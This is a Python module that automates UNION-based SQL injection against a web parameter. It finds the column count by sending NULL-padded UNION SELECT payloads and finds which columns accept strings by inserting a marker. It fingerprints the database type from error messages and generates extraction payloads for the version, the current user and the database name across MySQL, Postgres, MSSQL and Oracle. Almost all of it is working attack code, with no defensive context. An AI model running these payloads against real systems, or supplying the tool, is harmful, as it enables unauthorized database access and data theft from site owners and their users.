"""
SQL Fingerprinting Module for UNION-based Injection

Automatically discovers the number of columns needed in UNION-based SQL injection
and identifies which columns accept string data. Supports Oracle-specific syntax.

This module provides a systematic approach to:
1. Discover the column count required for successful UNION injection
2. Identify which columns can accept string values
3. Handle database-specific syntax (e.g., Oracle's FROM DUAL requirement)

Example Usage:
    >>> def send_payload(payload):
    ...     # Your HTTP request logic here
    ...     response = requests.get(f"http://example.com/page?id={payload}")
    ...     return {
    ...         'status_code': response.status_code,
    ...         'content': response.text,
    ...         'length': len(response.text)
    ...     }
    >>> 
    >>> fingerprinter = SqlFingerprinter(send_payload)
    >>> result = fingerprinter.discover_column_count(max_columns=10)
    >>> print(f"Discovered {result['column_count']} columns")
    >>> 
    >>> string_cols = fingerprinter.discover_string_columns(result['column_count'])
    >>> print(f"String-capable columns: {string_cols}")
"""

import logging
import time
from typing import Dict, List, Optional, Callable, Any, Tuple
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger(__name__)


class DatabaseType(Enum):
    """Supported database types for fingerprinting"""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    UNKNOWN = "unknown"


@dataclass
class FingerprintResult:
    """Result of a fingerprinting operation"""
    success: bool
    column_count: Optional[int] = None
    string_columns: Optional[List[int]] = None  # 0-indexed positions
    database_type: Optional[DatabaseType] = None
    confidence: float = 0.0
    method: str = ""
    details: Dict[str, Any] = None
    
    def __post_init__(self):
        if self.details is None:
            self.details = {}


class SqlFingerprinter:
    """
    SQL Fingerprinter for UNION-based injection attacks.
    
    This class provides methods to automatically discover the number of columns
    required for UNION-based SQL injection and identify which columns accept
    string data types.
    
    Attributes:
        transport_function: Callable that sends payloads and returns responses
        verbose: Enable verbose logging
        delay: Delay between requests in seconds (for rate limiting)
        detected_db_type: Detected database type
        baseline_response: Baseline response for comparison
    """
    
    # Error signatures to detect database type from error messages
    DB_ERROR_SIGNATURES = {
        DatabaseType.MYSQL: [
            r"You have an error in your SQL syntax",
            r"MySQL server version",
            r"mysql_fetch",
            r"MySQLSyntaxErrorException",
        ],
        DatabaseType.POSTGRESQL: [
            r"PostgreSQL.*ERROR",
            r"pg_query\(\)",
            r"PSQLException",
        ],
        DatabaseType.MSSQL: [
            r"Microsoft SQL Server",
            r"SqlException",
            r"\[SQL Server\]",
            r"Msg \d+,.*SQL Server",
        ],
        DatabaseType.ORACLE: [
            r"ORA-\d+",
            r"Oracle.*Driver",
            r"oracle\.jdbc",
        ],
        DatabaseType.SQLITE: [
            r"SQLite\/\d",
            r"sqlite3\.OperationalError",
        ],
    }
    
    # Success indicators in response
    SUCCESS_INDICATORS = [
        "successfully",
        "success",
        "found",
        "results",
        "records",
    ]
    
    def __init__(
        self, 
        transport_function: Callable[[str], Dict[str, Any]],
        verbose: bool = True,
        delay: float = 0.0,
        database_type: Optional[DatabaseType] = None
    ):
        """
        Initialize the SQL Fingerprinter.
        
        Args:
            transport_function: Function that accepts a payload string and returns
                a dict with keys: 'status_code', 'content', 'length'
            verbose: Enable verbose logging
            delay: Delay between requests in seconds
            database_type: Pre-set database type (if known), or None for auto-detect
        """
        self.transport_function = transport_function
        self.verbose = verbose
        self.delay = delay
        self.detected_db_type = database_type
        self.baseline_response = None
        self.baseline_error_response = None
        
        if verbose:
            logger.setLevel(logging.DEBUG)
        else:
            logger.setLevel(logging.INFO)
        
        logger.info("SqlFingerprinter initialized")
    
    def _log(self, message: str, level: str = "info"):
        """Log a message if verbose mode is enabled"""
        if self.verbose or level in ["warning", "error"]:
            getattr(logger, level)(message)
    
    def _send_payload(self, payload: str) -> Dict[str, Any]:
        """
        Send a payload and return the response.
        
        Args:
            payload: SQL injection payload to send
            
        Returns:
            Response dictionary with status_code, content, length
        """
        if self.delay > 0:
            time.sleep(self.delay)
        
        try:
            response = self.transport_function(payload)
            self._log(f"Sent payload: {payload[:100]}...", "debug")
            self._log(f"Response: status={response.get('status_code')}, length={response.get('length')}", "debug")
            return response
        except Exception as e:
            self._log(f"Error sending payload: {e}", "error")
            return {
                'status_code': 0,
                'content': '',
                'length': 0,
                'error': str(e)
            }
    
    def _detect_database_from_response(self, response: Dict[str, Any]) -> Optional[DatabaseType]:
        """
        Attempt to detect database type from error messages in response.
        
        Args:
            response: Response dictionary
            
        Returns:
            Detected DatabaseType or None
        """
        content = response.get('content', '')
        
        for db_type, patterns in self.DB_ERROR_SIGNATURES.items():
            import re
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    self._log(f"Detected database type: {db_type.value}", "info")
                    return db_type
        
        return None
    
    def _should_use_from_dual(self) -> bool:
        """
        Determine if FROM DUAL should be appended to payloads.
        
        Returns:
            True if Oracle database is detected or assumed
        """
        return self.detected_db_type == DatabaseType.ORACLE
    
    def _build_union_payload(self, num_nulls: int, string_position: Optional[int] = None, 
                            marker: str = "'SQLFingerprint'") -> str:
        """
        Build a UNION SELECT payload with specified number of NULLs.
        
        Args:
            num_nulls: Number of NULL columns
            string_position: Position (0-indexed) to insert string marker, or None for all NULLs
            marker: String marker to use for detection (default: 'SQLFingerprint')
            
        Returns:
            UNION SELECT payload
        """
        if num_nulls < 1:
            raise ValueError("num_nulls must be at least 1")
        
        # Build column list
        columns = []
        for i in range(num_nulls):
            if string_position is not None and i == string_position:
                columns.append(marker)
            else:
                columns.append("NULL")
        
        payload = f"' UNION SELECT {','.join(columns)}"
        
        # Append FROM DUAL for Oracle
        if self._should_use_from_dual():
            payload += " FROM DUAL"
        
        payload += "--"
        
        return payload
    
    def _establish_baseline(self) -> bool:
        """
        Establish baseline responses for comparison.
        
        Returns:
            True if baseline was successfully established
        """
        self._log("Establishing baseline response...")
        
        # Send a normal payload (non-malicious)
        normal_payload = "1"
        self.baseline_response = self._send_payload(normal_payload)
        
        # Send an error-inducing payload
        error_payload = "1'"
        self.baseline_error_response = self._send_payload(error_payload)
        
        # Try to detect database type from error
        if not self.detected_db_type:
            detected = self._detect_database_from_response(self.baseline_error_response)
            if detected:
                self.detected_db_type = detected
        
        self._log(f"Baseline established: normal_length={self.baseline_response.get('length')}, "
                 f"error_length={self.baseline_error_response.get('length')}")
        
        return True
    
    def _is_successful_injection(self, response: Dict[str, Any], 
                                 check_marker: Optional[str] = None) -> Tuple[bool, str]:
        """
        Determine if an injection was successful based on response analysis.
        
        Args:
            response: Response dictionary to analyze
            check_marker: Optional marker string to look for in response
            
        Returns:
            Tuple of (success: bool, reason: str)
        """
        if not response:
            return False, "No response"
        
        status_code = response.get('status_code', 0)
        content = response.get('content', '')
        length = response.get('length', 0)
        
        # Check 1: Error disappeared (error -> success)
        if self.baseline_error_response:
            baseline_error_length = self.baseline_error_response.get('length', 0)
            baseline_error_code = self.baseline_error_response.get('status_code', 0)
            
            # If previous attempt had error and now we don't
            if baseline_error_code >= 500 and status_code == 200:
                return True, "Status code changed from error to success"
            
            # Check for error message patterns
            import re
            has_baseline_error = any(
                re.search(pattern, self.baseline_error_response.get('content', ''), re.IGNORECASE)
                for patterns in self.DB_ERROR_SIGNATURES.values()
                for pattern in patterns
            )
            has_current_error = any(
                re.search(pattern, content, re.IGNORECASE)
                for patterns in self.DB_ERROR_SIGNATURES.values()
                for pattern in patterns
            )
            
            if has_baseline_error and not has_current_error:
                return True, "Error message disappeared"
        
        # Check 2: Marker string found
        if check_marker and check_marker.strip("'\"") in content:
            return True, f"Marker '{check_marker}' found in response"
        
        # Check 3: Response length changed significantly
        if self.baseline_response:
            baseline_length = self.baseline_response.get('length', 0)
            if baseline_length > 0:
                length_diff = abs(length - baseline_length)
                length_change_pct = (length_diff / baseline_length) * 100
                
                # Significant change but not a complete failure
                if 5 < length_change_pct < 200 and status_code == 200:
                    return True, f"Response length changed by {length_change_pct:.1f}%"
        
        # Check 4: Success indicators in content
        for indicator in self.SUCCESS_INDICATORS:
            if indicator.lower() in content.lower():
                return True, f"Success indicator '{indicator}' found"
        
        # Check 5: Status code is 200 and response has reasonable length
        if status_code == 200 and length > 100:
            # This is a weak signal, but might indicate success
            # Especially if we don't have a good baseline
            if not self.baseline_response:
                return True, "Status 200 with substantial response (weak signal)"
        
        return False, "No success indicators detected"
    
    def discover_column_count(
        self, 
        max_columns: int = 20,
        start_columns: int = 1
    ) -> FingerprintResult:
        """
        Systematically discover the number of columns for UNION-based injection.
        
        This method sends payloads with increasing numbers of NULL columns until
        a successful injection is detected.
        
        Args:
            max_columns: Maximum number of columns to test
            start_columns: Starting number of columns to test
            
        Returns:
            FingerprintResult with column_count if successful
        """
        self._log(f"Starting column count discovery (testing {start_columns} to {max_columns} columns)...")
        
        # Establish baseline if not done yet
        if not self.baseline_response:
            self._establish_baseline()
        
        result = FingerprintResult(
            success=False,
            method="column_count_discovery",
            database_type=self.detected_db_type
        )
        
        # Try increasing numbers of columns
        for num_cols in range(start_columns, max_columns + 1):
            payload = self._build_union_payload(num_cols)
            self._log(f"Testing {num_cols} column(s): {payload}")
            
            response = self._send_payload(payload)
            success, reason = self._is_successful_injection(response)
            
            if success:
                self._log(f"✓ SUCCESS: Discovered {num_cols} columns! Reason: {reason}", "info")
                result.success = True
                result.column_count = num_cols
                result.confidence = 0.9  # High confidence
                result.details = {
                    'payload': payload,
                    'reason': reason,
                    'response_length': response.get('length'),
                    'status_code': response.get('status_code')
                }
                return result
            else:
                self._log(f"  Failed with {num_cols} columns: {reason}", "debug")
        
        self._log(f"✗ Failed to discover column count (tested up to {max_columns} columns)", "warning")
        result.details = {
            'max_tested': max_columns,
            'message': 'Column count discovery failed'
        }
        
        return result
    
    def discover_string_columns(
        self,
        column_count: int,
        marker: str = "'SQLFingerprint'"
    ) -> FingerprintResult:
        """
        Discover which columns accept string values.
        
        After discovering the column count, this method tests each column position
        by replacing NULL with a string marker to identify columns that can hold
        string data.
        
        Args:
            column_count: Number of columns (from discover_column_count)
            marker: String marker to test with (default: 'SQLFingerprint')
            
        Returns:
            FingerprintResult with string_columns list (0-indexed positions)
        """
        self._log(f"Starting string column discovery for {column_count} columns...")
        
        result = FingerprintResult(
            success=False,
            column_count=column_count,
            method="string_column_discovery",
            database_type=self.detected_db_type,
            string_columns=[]
        )
        
        # Test each column position
        for col_idx in range(column_count):
            payload = self._build_union_payload(column_count, string_position=col_idx, marker=marker)
            self._log(f"Testing column {col_idx + 1}/{column_count}: {payload}")
            
            response = self._send_payload(payload)
            marker_clean = marker.strip("'\"")
            success, reason = self._is_successful_injection(response, check_marker=marker_clean)
            
            if success:
                self._log(f"✓ Column {col_idx + 1} accepts strings! Reason: {reason}", "info")
                result.string_columns.append(col_idx)
                result.success = True
            else:
                self._log(f"  Column {col_idx + 1} does not accept strings or marker not visible", "debug")
        
        if result.string_columns:
            result.confidence = 0.8
            result.details = {
                'marker_used': marker,
                'string_column_positions': [idx + 1 for idx in result.string_columns],  # 1-indexed for humans
                'message': f"Found {len(result.string_columns)} string-capable column(s)"
            }
            self._log(f"✓ String column discovery complete: {len(result.string_columns)} column(s) found", "info")
        else:
            result.confidence = 0.3
            result.details = {
                'marker_used': marker,
                'message': "No string-capable columns detected (this might be a false negative)"
            }
            self._log("✗ No string columns detected", "warning")
        
        return result
    
    def full_fingerprint(
        self,
        max_columns: int = 20,
        marker: str = "'SQLFingerprint'"
    ) -> FingerprintResult:
        """
        Perform complete fingerprinting: column count + string column discovery.
        
        This is a convenience method that combines column count discovery and
        string column detection into a single operation.
        
        Args:
            max_columns: Maximum number of columns to test
            marker: String marker for detection
            
        Returns:
            FingerprintResult with both column_count and string_columns
        """
        self._log("=" * 60, "info")
        self._log("Starting full SQL injection fingerprinting...", "info")
        self._log("=" * 60, "info")
        
        # Step 1: Discover column count
        col_result = self.discover_column_count(max_columns=max_columns)
        
        if not col_result.success:
            self._log("Column count discovery failed, cannot proceed", "error")
            return col_result
        
        self._log(f"\nColumn count: {col_result.column_count}", "info")
        
        # Step 2: Discover string columns
        string_result = self.discover_string_columns(
            column_count=col_result.column_count,
            marker=marker
        )
        
        # Combine results
        final_result = FingerprintResult(
            success=col_result.success and string_result.success,
            column_count=col_result.column_count,
            string_columns=string_result.string_columns,
            database_type=self.detected_db_type,
            confidence=min(col_result.confidence, string_result.confidence),
            method="full_fingerprint",
            details={
                'column_discovery': col_result.details,
                'string_discovery': string_result.details,
            }
        )
        
        self._log("=" * 60, "info")
        self._log("Fingerprinting complete!", "info")
        self._log(f"Results: {col_result.column_count} columns, "
                 f"{len(string_result.string_columns or [])} string-capable", "info")
        self._log("=" * 60, "info")
        
        return final_result
    
    def generate_exploitation_payloads(
        self,
        column_count: int,
        string_columns: List[int],
        data_to_extract: Optional[List[str]] = None
    ) -> List[str]:
        """
        Generate exploitation payloads based on fingerprinting results.
        
        Args:
            column_count: Number of columns
            string_columns: List of string-capable column indices (0-indexed)
            data_to_extract: Optional list of SQL expressions to extract
                (e.g., ['@@version', 'user()', 'database()'])
                
        Returns:
            List of exploitation payloads
        """
        if not string_columns:
            self._log("No string columns available for exploitation", "warning")
            return []
        
        payloads = []
        
        # Default extraction targets if none provided
        if not data_to_extract:
            if self.detected_db_type == DatabaseType.MYSQL:
                data_to_extract = ['@@version', 'user()', 'database()']
            elif self.detected_db_type == DatabaseType.POSTGRESQL:
                data_to_extract = ['version()', 'current_user', 'current_database()']
            elif self.detected_db_type == DatabaseType.MSSQL:
                data_to_extract = ['@@version', 'SYSTEM_USER', 'DB_NAME()']
            elif self.detected_db_type == DatabaseType.ORACLE:
                data_to_extract = ['banner FROM v$version WHERE ROWNUM=1', 'user', 'ora_database_name']
            else:
                data_to_extract = ['1', '2', '3']  # Fallback
        
        # Use the first string column for extraction
        extraction_col = string_columns[0]
        
        for expr in data_to_extract:
            columns = []
            for i in range(column_count):
                if i == extraction_col:
                    columns.append(expr)
                else:
                    columns.append("NULL")
            
            payload = f"' UNION SELECT {','.join(columns)}"
            
            if self._should_use_from_dual():
                payload += " FROM DUAL"
            
            payload += "--"
            payloads.append(payload)
        
        self._log(f"Generated {len(payloads)} exploitation payloads", "info")
        
        return payloads
    
    def format_report(self, result: FingerprintResult) -> str:
        """
        Format fingerprinting result as a human-readable report.
        
        Args:
            result: FingerprintResult to format
            
        Returns:
            Formatted report string
        """
        lines = []
        lines.append("=" * 60)
        lines.append("SQL INJECTION FINGERPRINTING REPORT")
        lines.append("=" * 60)
        
        if result.success:
            lines.append(f"Status: ✓ SUCCESS")
        else:
            lines.append(f"Status: ✗ FAILED")
        
        lines.append(f"Method: {result.method}")
        lines.append(f"Confidence: {result.confidence:.1%}")
        
        if result.database_type:
            lines.append(f"Database Type: {result.database_type.value.upper()}")
        
        if result.column_count:
            lines.append(f"\nColumn Count: {result.column_count}")
        
        if result.string_columns:
            # Convert to 1-indexed for human readability
            human_indices = [idx + 1 for idx in result.string_columns]
            lines.append(f"String-Capable Columns: {human_indices}")
            lines.append(f"  (Total: {len(result.string_columns)} column(s))")
        
        if result.details:
            lines.append("\nDetails:")
            for key, value in result.details.items():
                if isinstance(value, dict):
                    lines.append(f"  {key}:")
                    for k, v in value.items():
                        lines.append(f"    {k}: {v}")
                else:
                    lines.append(f"  {key}: {value}")
        
        lines.append("=" * 60)
        
        return "\n".join(lines)
